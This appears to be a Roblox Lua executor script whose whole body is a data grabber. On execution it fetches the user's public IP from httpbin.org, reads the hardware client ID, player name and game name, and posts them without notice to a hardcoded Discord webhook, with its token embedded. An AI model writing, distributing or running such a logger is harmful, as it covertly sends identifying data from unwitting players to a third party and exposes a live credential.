if not game:IsLoaded() then
    game.Loaded:Wait()
end
local localplayer             = game:GetService("Players").LocalPlayer
local HttpService             = game:GetService("HttpService")
local WebHook_URL             = "https://discord.com/api/webhooks/1083424873424109608/Rqv6qgmFLsxqw-2tH--CjfRD7OV1RvkjuLFI5P3CvuznlzjRk5HsVovNKK6OBBQ7piRs"
 
local request                 = http_request or request or HttpPost or syn.request
 
local body = http_request({Url = 'https://httpbin.org/ip'; Method = 'GET'}).Body;
local decoded = game:GetService("HttpService"):JSONDecode(body)
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()


 
local function rgbToHex(rgb)
    local hexadecimal = '0X'
    for key, value in pairs(rgb) do
        local hex = ''
        while (value > 0)do
            local index = math.fmod(value, 16) + 1
            value = math.floor(value / 16)
            hex = string.sub('0123456789ABCDEF', index, index) .. hex            
        end
        if(string.len(hex) == 0)then
            hex = '00'
        elseif(string.len(hex) == 1)then
            hex = '0' .. hex
        end
        hexadecimal = hexadecimal .. hex
    end
    return hexadecimal
end
 
local Data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["title"] =  "**Script executed in **" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
            ["description"] = "**Time:** " .. os.date("%m/%d/%Y") .. " | " .. os.date("%I:%M %p") .. "\n**Nick:** " .. game:GetService("Players").LocalPlayer.Name,
            ["type"] = "rich",
            ["color"] = tonumber(rgbToHex({0, 255, 0})),
            ["fields"] = {
                {
                    ["name"] = "HWID",
                    ["value"] = "||" .. HWID .. "||",
                    ["inline"] = true
                },
                {
                    ["name"] = "IP",
                    ["value"] = "||" .. body .. "||",
                    ["inline"] = true
                },
            },
       }
   }
}
local Encoded_Data = HttpService:JSONEncode(Data)
 
local C_Headers = {
   ["content-type"] = "application/json"
}
 
local response = {
    Url = WebHook_URL, 
    Body = Encoded_Data, 
    Method = "POST", 
    Headers = C_Headers
}
request(response)
